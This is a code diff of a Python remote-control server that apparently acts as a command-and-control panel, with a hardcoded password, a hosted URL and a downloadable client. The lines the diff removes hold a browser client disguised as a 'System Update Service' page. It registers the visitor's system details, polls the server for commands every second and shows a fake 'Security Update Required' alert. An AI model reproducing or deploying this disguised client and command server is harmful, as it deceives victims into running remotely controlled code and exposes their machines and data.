@@ -1,4 +1,4 @@
-# server.py - ULTRA INSTANT Version - 100% Instant Execution
+# server.py - Enhanced Version with Ultra Instant Features
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 import time
@@ -10,19 +10,18 @@ import sqlite3
 import os
 from datetime import datetime
 import socketserver
-import re
 
 class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
-    """Multi-threaded HTTP server for handling instant connections"""
+    """Multi-threaded HTTP server for handling concurrent connections"""
     daemon_threads = True
     allow_reuse_address = True
 
-class InstantRemoteControlHandler(BaseHTTPRequestHandler):
+class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     sessions = {}
     commands_queue = {}
     failed_attempts = {}
     
-    # ⚡ LOAD PASSWORDS INSTANTLY
+    # ⚡ INSTANT PASSWORD SYSTEM
     PASSWORD_FILE = "passwords.json"
     DEFAULT_PASSWORDS = {
         "user_password": "hblackhat",
@@ -51,8 +50,6 @@ class InstantRemoteControlHandler(BaseHTTPRequestHandler):
     session_lock = threading.Lock()
     MAX_FAILED_ATTEMPTS = 15
     BLOCK_TIME = 15  # ⚡ INSTANT BLOCK
-    ACTIVE_THRESHOLD = 10  # ⚡ INSTANT ACTIVITY CHECK
-    COMMAND_TIMEOUT = 1  # ⚡ INSTANT TIMEOUT
     blocked_ips = set()
     
     def init_database(self):
@@ -152,10 +149,9 @@ class InstantRemoteControlHandler(BaseHTTPRequestHandler):
             parsed_path = urllib.parse.urlparse(self.path)
             path = parsed_path.path
             
-            # ⚡ INSTANT ROUTING
+            # ⚡ INSTANT ROUTING - إزالة المسارات المتعلقة بالويب
             routes = {
                 '/': self.send_login_page,
-                '/remote': self.send_remote_client,
                 '/admin-auth': self.send_admin_auth_page,
                 '/control': self.send_control_panel,
                 '/sessions': self.send_sessions_list,
@@ -203,7 +199,7 @@ class InstantRemoteControlHandler(BaseHTTPRequestHandler):
                 
         except Exception as e:
             self.send_json({'error': str(e), 'instant': True})
-    
+
     def save_passwords(self, passwords):
         """INSTANT password saving"""
         try:
@@ -1037,20 +1033,6 @@ class InstantRemoteControlHandler(BaseHTTPRequestHandler):
                     0%, 100% { opacity: 1; }
                     50% { opacity: 0.7; }
                 }
-    
-                /* إصلاح الألوان للعناصر النشطة */
-                .client-info {
-                    color: var(--success) !important;
-                    font-weight: bold;
-                }
-    
-                .status-online {
-                    color: var(--success) !important;
-                }
-    
-                .status-offline {
-                    color: var(--danger) !important;
-                }
             </style>
         </head>
         <body>
@@ -1324,146 +1306,6 @@ class InstantRemoteControlHandler(BaseHTTPRequestHandler):
                 // ⚡ Ultra-fast auto-refresh every 1 second
                 setInterval(loadSessions, 1000);
                 loadSessions();
-            </script>
-        </body>
-        </html>
-        '''
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(html.encode())
-    
-    def send_remote_client(self):
-        html = '''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>System Update Service - INSTANT</title>
-            <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                body { 
-                    font-family: Arial; 
-                    background: linear-gradient(135deg, #667eea, #764ba2); 
-                    color: white; 
-                    text-align: center; 
-                    padding: 50px; 
-                    margin: 0;
-                }
-                .container {
-                    background: rgba(255,255,255,0.1);
-                    padding: 40px;
-                    border-radius: 15px;
-                    backdrop-filter: blur(10px);
-                }
-                .loader { 
-                    border: 5px solid #f3f3f3; 
-                    border-top: 5px solid #3498db; 
-                    border-radius: 50%; 
-                    width: 50px; 
-                    height: 50px; 
-                    animation: spin 1s linear infinite; 
-                    margin: 20px auto; 
-                }
-                @keyframes spin { 
-                    0% { transform: rotate(0deg); } 
-                    100% { transform: rotate(360deg); } 
-                }
-                .status {
-                    margin-top: 20px;
-                    padding: 10px;
-                    background: rgba(255,255,255,0.2);
-                    border-radius: 5px;
-                }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h2>System Initialization</h2>
-                <p>Loading essential security components...</p>
-                <div class="loader"></div>
-                <div class="status" id="status">Initializing...</div>
-                <p><small>Please wait while we prepare your system environment</small></p>
-            </div>
-            <script>
-                const clientId = 'web-' + Math.random().toString(36).substr(2, 12) + '-' + Date.now();
-                let statusElement = document.getElementById('status');
-                
-                function updateStatus(message) {
-                    statusElement.textContent = message;
-                }
-                
-                async function registerClient() {
-                    updateStatus('Registering with control server...');
-                    
-                    try {
-                        const response = await fetch('/register', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                client_id: clientId,
-                                user_agent: navigator.userAgent,
-                                platform: navigator.platform,
-                                type: 'web_client',
-                                computer: navigator.platform,
-                                os: navigator.userAgent
-                            })
-                        });
-                        
-                        const data = await response.json();
-                        if (data.success) {
-                            updateStatus('Registered successfully. Waiting for commands...');
-                            startCommandListener();
-                        } else {
-                            updateStatus('Registration failed. Retrying...');
-                            setTimeout(registerClient, 2000);
-                        }
-                    } catch (err) {
-                        updateStatus('Connection error. Retrying...');
-                        setTimeout(registerClient, 2000);
-                    }
-                }
-                
-                function startCommandListener() {
-                    setInterval(async () => {
-                        try {
-                            const response = await fetch('/commands?client=' + clientId);
-                            const cmd = await response.json();
-                            
-                            if (cmd.command) {
-                                updateStatus('Executing command: ' + cmd.command);
-                                let response = '';
-                                
-                                switch(cmd.command) {
-                                    case 'sysinfo':
-                                        response = `Web Client System Info:\\nUser Agent: ${navigator.userAgent}\\nPlatform: ${navigator.platform}\\nLanguage: ${navigator.language}`;
-                                        break;
-                                    case 'alert':
-                                        response = 'Alert dialog shown to user';
-                                        alert('System Notification: Security Update Required');
-                                        break;
-                                    default:
-                                        response = `Command executed: ${cmd.command}`;
-                                }
-                                
-                                await fetch('/response', {
-                                    method: 'POST',
-                                    headers: {'Content-Type': 'application/json'},
-                                    body: JSON.stringify({
-                                        client_id: clientId,
-                                        command: cmd.command,
-                                        response: response
-                                    })
-                                });
-                                
-                                updateStatus('Command executed: ' + cmd.command);
-                            }
-                        } catch (error) {
-                            // Silent error handling
-                        }
-                    }, 1000); // ⚡ Check every second
-                }
-                
-                setTimeout(registerClient, 1000);
             </script>
         </body>
         </html>
@@ -1883,9 +1725,8 @@ if __name__ == "__main__":
                 time_diff = (current_time - last_seen).total_seconds()
             
                 if time_diff < 300:  # 5 minutes
-                    # ⚡ إضافة حقل is_online للتمييز بين العملاء النشطين وغير النشطين
                     client_data['is_online'] = time_diff < 10  # ⚡ 10 seconds for online
-                    client_data['last_seen_seconds'] = time_diff  # ⚡ إضافة الوقت بالثواني
+                    client_data['last_seen_seconds'] = time_diff
                     active_clients.append(client_data)
                 else:
                     del self.sessions[client_id]
@@ -2023,26 +1864,25 @@ def instant_cleanup_sessions():
     while True:
         try:
             current_time = datetime.now()
-            with InstantRemoteControlHandler.session_lock:
-                for client_id, client_data in list(InstantRemoteControlHandler.sessions.items()):
+            with EnhancedRemoteControlHandler.session_lock:
+                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
                     last_seen = datetime.fromisoformat(client_data['last_seen'])
                     if (current_time - last_seen).total_seconds() > 300:
-                        del InstantRemoteControlHandler.sessions[client_id]
+                        del EnhancedRemoteControlHandler.sessions[client_id]
             time.sleep(30)  # ⚡ Clean every 30 seconds
         except:
             pass
 
 def main():
-    handler = InstantRemoteControlHandler
+    handler = EnhancedRemoteControlHandler
     handler.init_database(handler)
     
     threading.Thread(target=instant_cleanup_sessions, daemon=True).start()
     
     print("=" * 80)
-    print("🔒 ULTRA INSTANT REMOTE CONTROL SERVER - 0ms DELAY")
+    print("🔒 ENHANCED REMOTE CONTROL SERVER - ULTRA INSTANT MODE")
     print("=" * 80)
     print("Control Panel:     https://game-python-1.onrender.com")
-    print("Web Client:        https://game-python-1.onrender.com/remote")
     print("Python Client:     https://game-python-1.onrender.com/download-python-client")
     print("Security Settings: https://game-python-1.onrender.com/settings")
     print("Level 1 Password: hblackhat")
@@ -2055,9 +1895,8 @@ def main():
     print("=" * 80)
     
     try:
-        port = int(os.environ.get('PORT', 8080))
-        server = ThreadedHTTPServer(('0.0.0.0', port), InstantRemoteControlHandler)
-        print(f"🚀 Server started INSTANTLY on port {port}! Press Ctrl+C to stop.")
+        server = ThreadedHTTPServer(('0.0.0.0', 8080), EnhancedRemoteControlHandler)
+        print("🚀 Server started INSTANTLY on port 8080! Press Ctrl+C to stop.")
         print("⚡ Features: Instant Execution, 0ms Delay, Real-time Responses")
         server.serve_forever()
     except KeyboardInterrupt:
